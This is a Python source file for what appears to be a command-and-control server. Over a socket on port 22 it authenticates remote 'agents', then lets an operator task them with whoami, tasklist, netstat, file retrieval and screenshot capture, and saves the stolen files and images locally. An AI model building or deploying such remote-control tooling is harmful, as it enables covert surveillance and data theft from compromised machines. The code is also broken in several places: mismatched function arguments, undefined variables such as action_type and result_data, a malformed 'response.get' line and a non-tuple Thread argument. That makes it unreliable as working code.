import socket
from threading import Thread
import sqlite3
import json
import hashlib
import time
import base64
from protocol import parse_message,create_task,generate_task_id,send_message,recv_message

connected_agents = {}

def handle_incoming(sock_client,agent_name):
    while True:
        msg = recv_message(sock_client)
        if not msg:
            break

        if msg.get("action") == "ping":
            agent_id = msg.get("agent_id")
            print(f"Received ping from agent: {agent_id}")

        else:
            command(sock_client,agent_name)

def get_agent_id(agent_name):
    conn = sqlite3.connect("db.sql")
    cursor = conn.cursor()
    cursor.execute("SELECT id FROM agents WHERE agent_name = ?", (agent_name,))
    row = cursor.fetchone()
    conn.close()
    if row:
        return row[0]  
    return None
def hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()

def init_db():
    db_file = 'db.sql' 
    schema_file = 'schema.sql'
    conn = sqlite3.connect(db_file)
    cursor = conn.cursor()
    try:
        with open(schema_file, 'r', encoding='utf-8') as f:
            sql_script = f.read()
        cursor.executescript(sql_script)
        conn.commit()
        print(f"[+] Database '{db_file}' initialized using '{schema_file}'")
    except FileNotFoundError:
        print(f"[x] Error: Please create a file named '{schema_file}' in the same folder!")
    except Exception as e:
        print(f"[x] Error: {e}")
    finally:
        conn.close()

def check_auth(name, password_raw):
    conn = sqlite3.connect('db.sql')
    cursor = conn.cursor()
    try:
        cursor.execute('SELECT id, password_hash FROM agents WHERE agent_name = ?', (name,))
        result = cursor.fetchone()
        if result:
            agent_id, pw_hash = result
            if pw_hash == hash_password(password_raw):
                cursor.execute(
                    "UPDATE agents SET status=? WHERE id=?", ("ONLINE", agent_id)
                )
                conn.commit()
                return True
        return False
    finally:
        conn.close()

def add_agent_db(name, password, ip_address):
    hash_pw = hash_password(password)
    connection = sqlite3.connect("db.sql")
    cursor = connection.cursor()
    try:
        cursor.execute("""
            INSERT INTO agents (agent_name, password_hash, ip_address, status)
            VALUES (?, ?, ?, ?)""", (name, hash_pw, ip_address, 'ONLINE'))
        connection.commit()
        print(f"Successfully registered new agent: {name}")
        return True
    except sqlite3.IntegrityError:
        print(f"Error - agent {name} already exists")
        return False
    finally:
        connection.close()

def command(sock_client):
    while True:
        #print("Connected agents:", list(connected_agents.keys()))        
        print("enter agent id to send commands: ")
        agent_id = input().strip().lower()
        #if agent_id not in connected_agents:
            #print("[x] Agent not found!")
            #continue
        print("Choose a method: whoami, tasklist, netstat, getfile or scrennshot  exit to stop: ")
        command = input().strip().lower()
            
        if command == 'exit':
            print("Exiting command mode")
            
        #sock_client = connected_agents[agent_id]
        if command == 'getfile':    
            path = input("enter the path of the file")
            command_client=create_task(generate_task_id(),command,path)  
        else:
            command_client=create_task(generate_task_id(),command)  
 
        send_message(sock_client,command_client)    #sending command to do    


                


        try:        # part of recv data from agent
            response = recv_message(sock_client)
            type = response.get

            if action_type == "whoami":
                whoami_decoded = base64.b64decode(result_data).decode('utf-8')
                print(f"[+] Agent {agent_id} whoami: {whoami_decoded}")

            elif action_type == "screenshot":
                image_bytes = base64.b64decode(result_data)
                screenshot_file = f"screenshot_agent_{agent_id}.png"
                with open(screenshot_file, "wb") as f:
                    f.write(image_bytes)
                print(f"[+] Screenshot from agent {agent_id} saved to {screenshot_file}")
            elif action_type == "getfile":
                try:
                    file_bytes = base64.b64decode(result_data)
                    text = file_bytes.decode("utf-8")

                    with open("received.txt", "w", encoding="utf-8") as f:
                        f.write(text)

                    print("[+] TXT file saved as received.txt")

                except Exception as e:
                    print(f"[x] Error saving file: {e}")
            else:
                try:
                    text_result = base64.b64decode(result_data).decode('utf-8')
                    print(f"[+] Response from agent {agent_id} ({action_type}):\n{text_result}")
                except Exception:
                    # במקרה שהפלט הוא לא טקסט
                    print(f"[+] Response from agent {agent_id} ({action_type}): {result_data}")

        except ValueError:
            print("[x] Error: Received invalid header format.")

        except Exception as e:
            print(f"[x] Unexpected error: {e}")

def handle_request(sock_client, agent_info, addr_client):
    auth = False
    try:
        data = agent_info.get("data", {}) 
        name = data.get("name")
        password = data.get("password")
        ip = addr_client[0] 
        action = agent_info.get("action")

        if action == 'login':
            if check_auth(name, password):
                agent_id=get_agent_id(name)
                if agent_id is not None:
                    response = {"status": "success", "agent_id": agent_id}
                    response_bytes = json.dumps(response).encode()
                    header = f"{len(response_bytes):<10}".encode()
                    sock_client.sendall(header+response_bytes)
                    auth = True
                else:
                    response = {"status": "failed", "agent_id": None}
                    response_bytes = json.dumps(response).encode()
                    header = f"{len(response_bytes):<10}".encode()
                    sock_client.send(header + response_bytes)

        elif action == 'create':
            if add_agent_db(name, password, ip):
                agent_id=get_agent_id(name)
                response = {"status": "success", "agent_id": agent_id}
                response_bytes = json.dumps(response).encode()
                header = f"{len(response_bytes):<10}".encode()
                sock_client.send(header + response_bytes)
                auth = True
            else:
                response = {"status": "failed", "agent_id": None}
                response_bytes = json.dumps(response).encode()
                header = f"{len(response_bytes):<10}".encode()
                sock_client.send(header + response_bytes)
        
        if auth:#start to command
            print("success in auth")
            connected_agents[name] = sock_client
            Thread(target=command,args=(sock_client),daemon=True).start()
                
    except Exception as e:
        print(f"Error handling request: {e}")
 

if __name__ == '__main__':
    init_db() 
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('0.0.0.0', 22))
    sock.listen(5)
    print("The server is ready for agents")
    while True:
        sock_client, addr_client = sock.accept()
        print(f'New connection from {addr_client}')
        send_message(sock_client, {"action": "welcome", "msg": "Login or Create"})
        agent_info = recv_message(sock_client)
        Thread(target=handle_request, args=(sock_client, agent_info, addr_client), daemon=True).start()